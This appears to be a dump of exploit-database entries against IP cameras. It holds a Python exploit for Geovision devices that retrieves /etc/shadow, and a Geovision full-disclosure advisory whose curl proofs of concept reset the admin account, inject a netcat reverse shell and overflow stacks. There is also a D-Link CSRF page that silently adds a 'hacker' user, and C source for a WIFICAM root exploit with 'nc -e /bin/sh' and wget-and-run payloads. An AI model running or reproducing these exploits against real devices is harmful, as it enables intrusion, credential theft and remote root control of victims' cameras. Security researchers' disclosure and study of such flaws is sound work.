print ""[!] Enjoy the shell... ""
return True
except Exception as e:
if not NEW_IP_FILTER:
print ""[i] Last sending""
for Remove in range(0,4):
print ""[>] Deleting ipfilter Entry: {}"".format(Remove+1)
self.query_args = {
""bPolicy"":""0"", # 1 = Enable, 0 = Disable
""Delete"":""Remove"",
""szIpAddr"":"""",
""byOpId"":""0"",
""dwSelIndex"":""0"",
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,self.SessionID)
print ""[!] Enjoy the shell... ""
return True
print ""[!] Hmm... {}"".format(e)
print response.read()
return True
def GeoToken(self):
print ""[i] GeoToken PoC to login and download /etc/shadow via token symlink""
print ""[!] You must have valid login and password to generate the symlink""
try:
print ""[>] Requesting token1""
URI = '/BKCmdToken.php'
response = HTTPconnect(rhost,proto,verbose,credentials,raw_request,noexploit).Send(URI,headers,None,None)
result = json.load(response)
if verbose:
print json.dumps(result,sort_keys=True,indent=4, separators=(',', ': '))
print ""[i] Request OK?: {}"".format(result['success'])
if not result['success']:
sys.exit(1)
token1 = result['token']
token2 = hashlib.md5(hashlib.md5(token1 + 'gEo').hexdigest() + 'vIsIon').hexdigest()
query_args = {
""token1"":token1,
""token2"":token2
print ""[>] List files""
URI = '/BKFileList.php'
response = HTTPconnect(rhost,proto,verbose,credentials,raw_request,noexploit).Send(URI,headers,query_args,None)
result = json.load(response)
if verbose:
print json.dumps(result,sort_keys=True,indent=4, separators=(',', ': '))
for who in result.keys():
print len(who)
print ""[>] Requesting token1""
URI = '/BKCmdToken.php'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,None,None)
result = json.load(response)
if verbose:
print json.dumps(result,sort_keys=True,indent=4, separators=(',', ': '))
print ""[i] Request OK?: {}"".format(result['success'])
if not result['success']:
return False
token1 = result['token']
token2 = hashlib.md5(username + ':' + token1 + ':' + password).hexdigest()
filename = '/etc/shadow'
self.query_args = {
""token1"":token1,
""token2"":token2,
""filename"":filename
print ""[>] Requesting download file link""
URI = '/BKDownloadLink.cgi'
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,None)
response = response.read()#[:900]
response = response.replace(""'"", ""\"""")
result = json.loads(response)
print ""[i] Request OK?: {}"".format(result['success'])
if not result['success']:
return False
if verbose:
print json.dumps(result,sort_keys=True,indent=4, separators=(',', ': '))
URI = '/ssi.cgi' + result['dl_folder'] + '/' + result['dl_token']
print ""[>] downloading ({}) with ({})"".format(filename,URI)
response = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.raw_request,self.noexploit).Send(URI,self.headers,self.query_args,None)
response = response.read()
print response
return True
except Exception as e:
print ""[i] GEO Token fail ({})"".format(e)
return False
if __name__ == '__main__':
INFO =  '[Geovision Inc. IPC/IPV RCE PoCs (2017 bashis <mcw noemail eu>)]\n'
HTTP = ""http""
HTTPS = ""https""
proto = HTTP
verbose = False
noexploit = False
raw_request = True
rhost = '192.168.57.20'# Default Remote HOST
rport = '80'# Default Remote PORT
lhost = '192.168.57.1'# Default Local HOST
lport = '1337'# Default Local PORT
credentials = False
SessionID =  str(int(random.random() * 100000))
DumpSettings = False
deviceinfo = False
GEOtoken = False
anonymous = False
filtersetting = False
usersetting = False
jpegstream = False
picturecatch = False
username = 'admin'
password = 'admin'
try:
arg_parser = argparse.ArgumentParser(
prog=sys.argv[0],
description=('[*] '+ INFO +' [*]'))
arg_parser.add_argument('--rhost', required=True, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
arg_parser.add_argument('--rport', required=True, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
arg_parser.add_argument('--autoip', required=False, default=False, action='store_true', help='Detect External Connect Back IP [Default: False]')
arg_parser.add_argument('--deviceinfo', required=False, default=False, action='store_true', help='Request model and firmware version')
arg_parser.add_argument('-g','--geotoken', required=False, default=False, action='store_true', help='Try retrieve /etc/shadow with geotoken')
arg_parser.add_argument('-a','--anonymous', required=False, default=False, action='store_true', help='Try pwning as anonymous')
arg_parser.add_argument('-f','--filtersetting', required=False, default=False, action='store_true', help='Try pwning with FilterSetting.cgi')
arg_parser.add_argument('-p','--picturecatch', required=False, default=False, action='store_true', help='Try pwning with PictureCatch.cgi')
arg_parser.add_argument('-j','--jpegstream', required=False, default=False, action='store_true', help='Try pwning with JpegStream.cgi')
arg_parser.add_argument('-u','--usersetting', required=False, default=False, action='store_true', help='Try pwning with UserSetting.cgi')
arg_parser.add_argument('-d','--dump', required=False, default=False, action='store_true', help='Try pwning remote config')
arg_parser.add_argument('--username', required=False, help='Username [Default: '+ username +']')
arg_parser.add_argument('--password', required=False, help='password [Default: '+ password +']')
if credentials:
arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ credentials + ']')
arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
args = arg_parser.parse_args()
except Exception as e:
print INFO,""\nError: {}\n"".format(str(e))
sys.exit(1)
print ""\n[*]"",INFO
if args.verbose:
verbose = args.verbose
if args.https:
proto = HTTPS
if not args.rport:
rport = '443'
if credentials and args.auth:
credentials = args.auth
if args.geotoken:
GEOtoken = args.geotoken
if args.anonymous:
anonymous = True
if args.deviceinfo:
deviceinfo = True
if args.dump:
DumpSettings = True
if args.filtersetting:
FilterSetting = True
if args.usersetting:
usersetting = True
if args.jpegstream:
jpegstream = True
if args.picturecatch:
picturecatch = True
if args.username:
username = args.username
if args.password:
password = args.password
if args.noexploit:
noexploit = args.noexploit
if args.rport:
rport = args.rport
if args.rhost:
rhost = args.rhost
IP = args.rhost
if args.lport:
lport = args.lport
if args.lhost:
lhost = args.lhost
elif args.autoip:
try:
headers = {
'Connection': 'close',
'Accept':'gzip, deflate',
'Accept-Language':'en-US,en;q=0.8',
'Cache-Control':'max-age=0',
'User-Agent':'Mozilla'
print ""[>] Trying to find out my external IP""
lhost = HTTPconnect(""whatismyip.akamai.com"",proto,verbose,credentials,False,noexploit).Send(""/"",headers,None,None)
if verbose:
print ""[Verbose] Detected my external IP:"",lhost
except Exception as e:
print ""[<] "",e
sys.exit(1)
if not Validate(verbose).Port(rport):
print ""[!] Invalid RPORT - Choose between 1 and 65535""
sys.exit(1)
rhost = Validate(verbose).Host(rhost)
if not rhost:
print ""[!] Invalid RHOST""
sys.exit(1)
lhost = Validate(verbose).Host(lhost)
if not lhost:
print ""[!] Invalid LHOST""
sys.exit(1)
rhost = Validate(verbose).Host(rhost)
if not rhost:
print ""[!] Invalid RHOST""
sys.exit(1)
if args.https:
print ""[i] HTTPS / SSL Mode Selected""
print ""[i] Remote target IP:"",rhost
print ""[i] Remote target PORT:"",rport
if not args.geotoken and not args.dump and not args.deviceinfo:
print ""[i] Connect back IP:"",lhost
print ""[i] Connect back PORT:"",lport
rhost = rhost + ':' + rport
headers = {
'Connection': 'close',
'Content-Type':'application/x-www-form-urlencoded',
'Accept':'gzip, deflate',
'Accept-Language':'en-US,en;q=0.8',
'Cache-Control':'max-age=0',
'User-Agent':'Mozilla'
Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).DeviceInfo()
if deviceinfo:
sys.exit(0)
if GEOtoken:
Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).DeviceInfo()
if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).GeoToken():
print ""[!] Failed""
sys.exit(1)
else:
sys.exit(0)
if anonymous:
if jpegstream:
if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).JpegStream(DumpSettings):
print ""[!] Failed""
sys.exit(0)
elif picturecatch:
if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).PictureCatch(DumpSettings):
print ""[!] Failed""
sys.exit(0)
else:
print ""[!] Needed: --anonymous [--picturecatch | --jpegstream]""
sys.exit(1)
else:
if usersetting:
if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).UserSetting(DumpSettings):
print ""[!] Failed""
sys.exit(0)
elif filtersetting:
if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).FilterSetting():
print ""[!] Failed""
sys.exit(0)
elif jpegstream:
if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).JpegStream(DumpSettings):
print ""[!] Failed""
sys.exit(0)
elif picturecatch:
if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).PictureCatch(DumpSettings):
print ""[!] Failed""
sys.exit(0)
else:
print ""[!] Needed: --usersetting | --jpegstream | --picturecatch | --filtersetting""
sys.exit(1)
sys.exit(0)"
2018-02-01,Remote,Hardware,bashis,Geovision Inc. IP Camera/Video/Access Control,Multiple Remote Command Execution / Stack Overflow / Double Free / Unauthorized Access,"#0  0x49494948 in ?? ()
#1  0x0003889c in ?? ()
#0  0x49494948 in ?? ()
#1  0x3e4c4d54 in ?? ()","[STX]
Subject: Geovision Inc. IP Camera/Video/Access Control Multiple Remote Command Execution - Multiple Stack Overflow - Double free - Unauthorized Access
Attack vector: Remote
Authentication: Anonymous (no credentials needed)
Researcher: bashis <mcw noemail eu> (November 2017)
PoC: https://github.com/mcw0/PoC
Python PoC: https://github.com/mcw0/PoC/blob/master/Geovision-PoC.py
Release date: February 1, 2018
Full Disclosure: 90 days
Vendor URL: http://www.geovision.com.tw/
Updated FW: http://www.geovision.com.tw/download/product/
heap: Executable + Non-ASLR
stack: Executable + ASLR
Vulnerable:
Practically more or less all models and versions with FW before November/December 2017 of Geovision embedded IP devices suffer from one or more of these vulnerabilities.
Verified:
GV-BX1500 v3.10 2016-12-02
GV-MFD1501 v3.12 2017-06-19
Timeline:
November 5, 2017: Initiated contact with Geovision
November 6, 2017: Response from Geovision
November 8, 2017: Informed Geovision about quite dangerous bug in 'FilterSetting.cgi'
November 8, 2017: Responce from Geovision
November 15, 2017: Reached out to Geovision to offer more time until FD
(due to the easy exploiting and number of vulnerabilities in large number of products)
November 17, 2017: Request from Geovision to have time to end of January 2018
November 18, 2017: Agreed to FD date of February 1, 2018
November 20, 2017: Received one image for test purposes
November 26, 2017: ACK to Geovision that image looks good
January 16, 2018: Sent this FD and PoC Python to Geovision for comments before FD, if any objections.
January 17, 2018: Received all OK from Geovision, no objections, toghether with thanks for the effort for trying to make Geovision products more safe.
January 17, 2018: Thanked Geoviosion for good cooperation.
February 1, 2018: Full disclosure
-[Unathorized Access]-
1)
PoC: Reset and change 'admin' to 'root' with passwd 'PWN' (GV-MFD1501 v3.12 2017-06-19)
curl -v http://192.168.57.20:80/UserCreat.cgi?admin_username=root\&admin_passwordNew=PWN
2)
PoC: Change device WebGUI language back to default
curl -v -X POST http://192.168.57.20:80/LangSetting.cgi -d lang_type=0\&submit=Apply
3)
Unathorized upgrade of firmware.
PoC: Reboot the remote device as in 'run_upgrade_prepare'
curl -v ""http://192.168.57.20:80/geo-cgi/sdk_fw_update.cgi""
URI: http://192.168.57.20/ssi.cgi/FirmwareUpdate.htm
4)
PoC: Upload of Firmware header for checking correct firmware.
curl -v -X PUT ""http://192.168.57.20:80/geo-cgi/sdk_fw_check.cgi"" -d ""BAAAALAAAAABAgAAAAAAADKvfBIAAAABGDIpBwAAAABhc19jcmZpZAAAAAAAAAAALgYAALAAAADXe///AAAAAAAAAABib290bG9hZGVyLmJpbgAAAAA0ALAAAgBOAP//AAAAAAAAAAB1SW1hZ2UAAAAAAAAAAAAA1OIaALAANgDSw///AAAAAAAAAAByYW1kaXNrLmd6AAAAAAAAALBtArAAUgAIuf//AAAAAAAAAAAjIFN0YXJpbmcgd2l0aCAnSElEOicgYW5kIHNwbGl0IGJ5ICcsJyBhbmQgZW5kIHdpdGggJ1xyXG4nICgweDBkIDB4MGEpDQpISUQ6MTE3MCxOYW1lOkdWLUxQQzIyMTAsRG93blZlcjoxMDINCkhJRDoxMTUwLE5hbWU6R1YtUFBUWjczMDBfU0QsRG93blZlcjozMDUNCkhJRDoxMTUyLE5hbWU6R1YtUFBUWjczMDBfRkUsRG93blZlcjozMDUNCkhJRDoxMTc2LE5hbWU6R1YtQlgzNDAwRSxEb3duVmVyOjMwMw0KSElEOjExNzUsTmFtZTpHVi1CWDE1MDBFLERvd25WZXI6MzAzDQpISUQ6MTEwMSxOYW1lOkdWLVVORkUyNTAzLERvd25WZXI6MzA2DQpISUQ6MTE0NSxOYW1lOkdWLVVOMjYwMCxEb3c=""
/var/log/messages
192.168.57.1 - - [01/Jan/1970:00:32:43 +0000] ""PUT /geo-cgi/sdk_fw_check.cgi HTTP/1.1"" 200 25000 """" ""curl/7.38.0""
Nov  5 17:11:51 thttpd[1576]: (1576) cgi[3734]: Spawned CGI process 1802 to run 'geo-cgi/sdk_fw_check.cgi', query[]
Nov  5 17:11:51 sdk_fw_check.cgi: CONTENT_LENGTH = 684
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) main[183]: base64 encode length : 684
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) main[184]: base64 encode output : BAAAALAAAAABAgAAAAAAADKvfBIAAAABGDIpBwAAAABhc19jcmZpZAAAAAAAAAAALgYAALAAAADXe///AAAAAAAAAABib290bG9hZGVyLmJpbgAAAAA0ALAAAgBOAP//AAAAAAAAAAB1SW1hZ2UAAAAAAAAAAAAA1OIaALAANgDSw///AAAAAAAAAAByYW1kaXNrLmd6AAAAAAAAALBtArAAUgAIuf//AAAAAAAAAAAjIFN0YXJpbmcgd2l0aCAnSElEOicgYW5kIHNwbGl0IGJ5ICcsJyBhbmQgZW5kIHdpdGggJ1xyXG4nICgweDBkIDB4MGEpDQpISUQ6MTE3MCxOYW1lOkdWLUxQQzIyMTAsRG93blZlcjoxMDINCkhJRDoxMTUwLE5hbWU6R1YtUFBUWjczMDBfU0QsRG93blZlcjozMDUNCkhJRDoxMTUyLE5hbWU6R1YtUFBUWjczMDBfRkUsRG93blZlcjoz
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) main[185]: decode length        : 512
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) main[186]: decode output        : ^D
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) check_image_format_is_OK[839]: (1) Product Error: Image's magic[513] != DEV_MAGIC[1000]
Nov  5 17:11:51 sdk_fw_check.cgi: (1802) check_firmware[135]: ERROR : check firmware, length [512]
5)
Unathorized access of 'sdk_config_set.cgi' to Import Setting (SDK_CONFIG_SET)
curl -v -X PUT ""http://192.168.57.20:80/geo-cgi/sdk_config_set.cgi""
6)
/PSIA/
Access to GET (read) and PUT (write)
curl -v -X PUT http://192.168.57.20:80/PSIA/System/reboot
curl -v -X PUT http://192.168.57.20:80/PSIA/System/updateFirmware
curl -v -X PUT http://192.168.57.20:80/PSIA/System/factoryReset
List: /PSIA/System/reboot/index
Usage: /PSIA/System/reboot/description
PoC: curl -v -X PUT http://192.168.57.20:80/PSIA/System/reboot
Full recursive list: /PSIA/indexr
-[Remote Command Execution]-
7)
PoC will create 'tmp/Login.cgi' with '<!--#include file=""SYS_CFG""-->', then Dump All Settings,
including login and passwords in clear text by accessing the created Login.htm
curl -v ""http://192.168.57.20:80/PictureCatch.cgi?username=GEOVISION&password=%3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22--%3e%22%3etmp/Login.htm%3b&data_type=1&attachment=1&channel=1&secret=1&key=PWNED"" ; curl -v ""http://192.168.57.20:80/ssi.cgi/tmp/Login.htm""
< HTTP/1.1 200 OK
-                                   -
-         Dump All Settings         -
-                                   -
8)
PoC will pop reverse connect back shell to 192.168.57.1
/www/PictureCatch.cgi
curl -v ""http://192.168.57.20:80/PictureCatch.cgi?username=GEOVISION\&password=%3bmkfifo%20/tmp/s0%3bnc%20-w%205%20192.168.57.1%201337</tmp/s0|/bin/sh>/tmp/s0%202>/tmp/s0%3brm%20/tmp/s0%3b\&data_type=1\&attachment=1\&channel=1\&secret=1\&key=PWNED""
$ ncat -vlp 1337
Ncat: Version 7.12 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.57.20.
Ncat: Connection from 192.168.57.20:55331.
pwd
/www
id
uid=0(root) gid=0(root)
exit
9)
/www/JpegStream.cgi
curl -v ""http://192.168.57.20:80/JpegStream.cgi?username=GEOVISION\&password=%3bmkfifo%20/tmp/s0%3bnc%20-w%205%20192.168.57.1%201337</tmp/s0|/bin/sh>/tmp/s0%202>/tmp/s0%3brm%20/tmp/s0%3b\&data_type=1\&attachment=1\&channel=1\&secret=1\&key=PWNED""
$ ncat -vlp 1337
Ncat: Version 7.12 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.57.20.
Ncat: Connection from 192.168.57.20:55332.
pwd
/www
id
uid=0(root) gid=0(root)
exit
Problem(s):
SIiUTIL_GetDecryptData calling popen() ""sh -c /var/www/testbf d PWNED ;mkfifo /tmp/s0;..."" without proper sanitation of user input
Note:
Vulnerable tags: 'username', 'password' and 'key'
-[Double free]-
10)
curl -v http://192.168.57.20:80/PSIA/System/configurationData
*** glibc detected *** psia.cgi: double free or corruption (out): 0x00077d10 ***
-[Stack Overflow]-
11)
/usr/local/thttpd
curl -v ""http://192.168.57.20:80/htpasswd?password=`for((i=0;i<140;i++));do echo -en ""X"";done`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII""
Program received signal SIGSEGV, Segmentation fault.
0x49494948 in ?? ()
(gdb) bt
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb) i reg
r0             0x00
r1             0x3696503577424
r2             0x11
r3             0x68104
r4             0x414141411094795585
r5             0x424242421111638594
r6             0x434343431128481603
r7             0x444444441145324612
r8             0x454545451162167621
r9             0x464646461179010630
r10            0x474747471195853639
r11            0x484848481212696648
r12            0x3680e83571944
sp             0x7ee0fbc80x7ee0fbc8
lr             0x3889c231580
pc             0x494949480x49494948
cpsr           0x20000030536870960
(gdb)
12)
/usr/local/thttpd
curl -v http://192.168.57.20:80/geo-cgi/param.cgi?skey=`for((i=0;i<44;i++)); do echo -en ""X""; done`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN
Program received signal SIGSEGV, Segmentation fault.
0x49494948 in ?? ()
(gdb) bt
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb) i reg
r0             0xffffffff4294967295
r1             0x7e963e8c2123775628
r2             0x00
r3             0x242578
r4             0x414141411094795585
r5             0x424242421111638594
r6             0x434343431128481603
r7             0x444444441145324612
r8             0x454545451162167621
r9             0x464646461179010630
r10            0x474747471195853639
r11            0x484848481212696648
r12            0xa10
sp             0x7e983c480x7e983c48
lr             0x3e4c4d541045187924
pc             0x494949480x49494948
cpsr           0x600000301610612784
(gdb)
13)
/www/PictureCatch.cgi
curl -v ""http://192.168.57.20:80/PictureCatch.cgi?username=`for((i=0;i<324;i++));do echo -en ""A"";done`BBBB&password=GEOVISION&data_type=1&attachment=1&channel=1&secret=1&key=PWNED""
[pid  2215] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
14)
/www/Login3gpp.cgi
curl -v ""http://192.168.57.20:80/Login3gpp.cgi?username=`for((i=0;i<444;i++));do echo -en ""A"";done`BBBB&password=PWNED""
[pid  2161] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424243} ---
15)
/www/Login.cgi
curl -v ""http://192.168.57.20:80/Login.cgi?username=`for((i=0;i<477;i++));do echo -en ""A"";done`BBBB&password=PWNED""
[pid  2135] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
Note: username and password uses strcpy() and both are vulnerable.
However, 'password' cannot be used remotely since 'thttpd' checking for this, and is vulnerable for stack overflow.
Have a nice day
/bashis
[ETX]"
2017-03-26,WebApps,Hardware,SlidingWindow,D-Link DCS-936L Network Camera,Cross-Site Request Forgery,"# Exploit Title: [D-Link DCS-936L network camera incomplete/weak CSRF protection vulnerability]
# Date: [26/03/2017]
# Exploit Author: [SlidingWindow] , Twitter: @Kapil_Khot
# Vendor Homepage: [http://us.dlink.com/product-category/home-solutions/view/network-cameras/]
# Version: [Tested on DCS-936L with firmware version 1.03. Other versions/models are also be affected]
# Tested on: [DCS-936L with firmware version 1.02.01]
# CVE : [CVE-2017-7851]
#Product:-
#Vulnerability:-
#Vulnerability Details:-
#Proof-of-Concept:-
#Vulnerability Disclosure Timeline:","Small and unobtrusive, SecuriCam™ IP surveillance solutions from D-Link allow you to monitor your offices or warehouses from anywhere - at anytime. Extreme Low LUX optics, 2 way audio, and full pan/tilt/zoom manipulation provide everything an SMB needs to safeguard their valuable resources.
D-Link DCS-936L network camera incomplete/weak CSRF protection vulnerability.
D-Link DCS-936L network camera incomplete/weak CSRF protection vulnerability (CVE-2017-7851)
D-Link DCS-936L devices with firmware 1.02.01 have CSRF. If a victim is logged into the camera's web console and visits a malicious site hosting a <Target_Device_IP.HTML> from another tab in the same browser, the malicious site can send requests to the victim's device. An attacker can add a new user, replace the firmware image with a malicious one, or connect the victim's device to a rogue Wireless Network.
An attacker can easily find out public IP address of victim's device on Shodan or similar search engines to create <Target_Device_IP.HTML> file. Victim must be logged into the camera's web console and visit attacker's site from another tab in the same browser.
D-Link DCS-936L prevents CSRF attack by looking at ‘Referer’ header. The ‘Referer’ IP should match with the one in ‘HOST’ header. If it does not, HTTP 403 is returned in the response. However, this device does not perform a strict check on ‘Referer’ header. It seems that it looks for the device’s IP address (which is the one in ‘HOST’ header) anywhere in the ‘Referer’ header. If found, it happily accepts the request.
An unauthenticated, remote attacker could host a malicious site that makes requests to the victim’s device without having credentials. In a targeted attack, an attacker needs to trick victim to visit a malicious site that exploits this vulnerability.
1. Attacker hosts a ‘<target_ip>.html’ on <attacking_ip>
<html>
<body>
<form id=""CSRF"" action=""http://<target_ip>/eng/admin/tools_admin.cgi"" method=""POST"">
<input type=""hidden"" name=""user"" value=""hacker"">
<input type=""hidden"" name=""action"" value=""set"">
<input type=""hidden"" name=""password"" value=""abc123"">
<input type=""hidden"" name=""confirmPassword"" value=""abc123"">
</form>
<script>
window.onload = function(){
document.forms['CSRF'].submit()
</script>
</body>
</html>
2. Victim logs into his device.
3. Victim then visits attackers site http://<attacking_ip>/<target_ip>.html
4. Above request adds a new user ‘Hacker’ which reboots the web server.
6. Browser sends add new user request to the target device <target_ip>. Victim's browser sets 'Referer' header to 'http://<attacking_ip>/<target_ip>.html'. As this contains the IP address of the device (<target_ip>), this request is processed successfully.
7. Server response shows user hacker added successfully:
8. Attacker can now log into the device as hacker/abc123
26/03/2017: First email to disclose vulnerability to D-Link incident response team.
26/03/2017: Vendor acknowledged the report.
25/05/2017: Vendor confirmed that development has been completed and it's undergoing security audit.
13/10/2017: Firmwared released to production: ftp://ftp2.dlink.com/PRODUCTS/DCS-936L/REVA/DCS-936L_REVA_FIRMWARE_v1.05.07.zip
13/11/2017: DCS-936L Firmware Release Notes: ftp://ftp2.dlink.com/PRODUCTS/DCS-936L/REVA/DCS-936L_REVA_RELEASE_NOTES_v1.05.07.pdf
15/11/2017: Published CVE-2017-7851"
2017-03-08,Remote,Hardware,PierreKimSec,Wireless IP Camera (P2P) WIFICAM,Remote Code Execution,"// Exploit-DB Note ~ Source: https://pierrekim.github.io/advisories/expl-goahead-camera.c
// Exploit-DB Note ~ Credit: https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#define CAM_PORT 80
#define REMOTE_HOST ""192.168.1.1""
#define REMOTE_PORT ""1337""
#define PAYLOAD_0 ""GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(nc%20"" REMOTE_HOST ""+"" REMOTE_PORT ""%20-e/bin/sh)&dir=/&mode=PORT&upload_interval=0\r\n\r\n""
#define PAYLOAD_1 ""GET /ftptest.cgi?next_url=test_ftp.htm&loginuse=%s&loginpas=%s\r\n\r\n""
#define PAYLOAD_2 ""GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=passpasspasspasspasspasspasspasspass&dir=/&mode=PORT&upload_interval=0\r\n\r\n""
#define ALTERNATIVE_PAYLOAD_zero0 ""GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(nc+"" REMOTE_HOST ""+"" REMOTE_PORT ""+-e/bin/sh)&dir=/&mode=PORT&upload_interval=0\r\n\r\n""
#define ALTERNATIVE_PAYLOAD_zero1 ""GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(wget+http://"" REMOTE_HOST ""/stufz&&./stuff)&dir=/&mode=PORT&upload_interval=0\r\n\r\n""","char *    creds(char  *argv,
int   get_config);
int       rce(char    *argv,
char    *id,
char    attack[],
char    desc[]);
int   main(int        argc,
char       **argv,
char       **envp)
char                *id;
printf(""Camera 0day root RCE with connect-back @PierreKimSec\n\n"");
if (argc < 2)
printf(""%s target\n"", argv[0]);
printf(""%s target --get-config      will dump the configuration and exit\n"", argv[0]);
return (1);
if (argc == 2)
printf(""Please run `nc -vlp %s` on %s\n\n"", REMOTE_PORT, REMOTE_HOST);
if (argc == 3 && !strcmp(argv[2], ""--get-config""))
id = creds(argv[1], 1);
else
id = creds(argv[1], 0);
if (id == NULL)
printf(""exploit failed\n"");
return (1);
printf(""done\n"");
printf(""    login = %s\n"", id);
printf(""    pass  = %s\n"", id + 32);
if (!rce(argv[1], id, PAYLOAD_0, ""planting""))
printf(""done\n"");
sleep(1);
if (!rce(argv[1], id, PAYLOAD_1, ""executing""))
printf(""done\n"");
if (!rce(argv[1], id, PAYLOAD_2, ""cleaning""))
printf(""done\n"");
if (!rce(argv[1], id, PAYLOAD_1, ""cleaning""))
printf(""done\n"");
printf(""[+] enjoy your root shell on %s:%s\n"", REMOTE_HOST, REMOTE_PORT);
return (0);
char *    creds(char  *argv,
int   get_config)
int                 sock;
int                 n;
struct sockaddr_in  serv_addr;
char                buf[8192] = { 0 };
char                *out;
char                *tmp;
char                payload[] = ""GET /system.ini?loginuse&loginpas HTTP/1.0\r\n\r\n"";
int                 old_n;
int                 n_total;
sock = 0;
n = 0;
old_n = 0;
n_total = 0;
printf(""[+] bypassing auth ... "");
if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
printf(""Error while creating socket\n"");
return (NULL);
memset(&serv_addr, '0', sizeof(serv_addr));
serv_addr.sin_family = AF_INET;
serv_addr.sin_port = htons(CAM_PORT);
if (inet_pton(AF_INET, argv, &serv_addr.sin_addr) <= 0)
printf(""Error while inet_pton\n"");
return (NULL);
if (connect(sock, (struct sockaddr *)&serv_addr , sizeof(serv_addr)) < 0)
printf(""creds: connect failed\n"");
return (NULL);
if (send(sock, payload, strlen(payload) , 0) < 0)
printf(""creds: send failed\n"");
return (NULL);
if (!(tmp = malloc(10 * 1024 * sizeof(char))))
return (NULL);
if (!(out = calloc(64, sizeof(char))))
return (NULL);
while ((n = recv(sock, buf, sizeof(buf), 0)) > 0)
n_total += n;
if (n_total < 1024 * 10)
memcpy(tmp + old_n, buf, n);
if (n >= 0)
old_n = n;
close(sock);
[ HTTP HEADERS ]
000????: 0000 0a0a 0a0a 01.. .... .... .... ....
^^^^ ^^^^ ^^
Useful reference in the binary data
in order to to find the positions of
credentials
0000690: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
00006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00006b0: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
00006c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
NOTE: reference can be too:
000????: 0006 0606 0606 0100 000a .... .... ....
Other method: parse everything, find the ""admin"" string and extract the associated password
by adding 31bytes after the address of 'a'[dmin].
Works if the login is admin (seems to be this by default, but can be changed by the user)
if (get_config)
for (unsigned int j = 0; j < n_total && j < 10 * 1024; j++)
printf(""%c"", tmp[j]);
exit (0);
for (unsigned int j = 50; j < 10 * 1024; j++)
if (tmp[j - 4] == 0x0a &&
tmp[j - 3] == 0x0a &&
tmp[j - 2] == 0x0a &&
tmp[j - 1] == 0x0a &&
tmp[j]     == 0x01)
if (j + 170 < 10 * 1024)
strcat(out, &tmp[j + 138]);
strcat(out + 32 * sizeof(char), &tmp[j + 170]);
free(tmp);
return (out);
free(tmp);
return (NULL);
int       rce(char    *argv,
char    *id,
char    attack[],
char    desc[])
int                 sock;
struct sockaddr_in  serv_addr;
char                *payload;
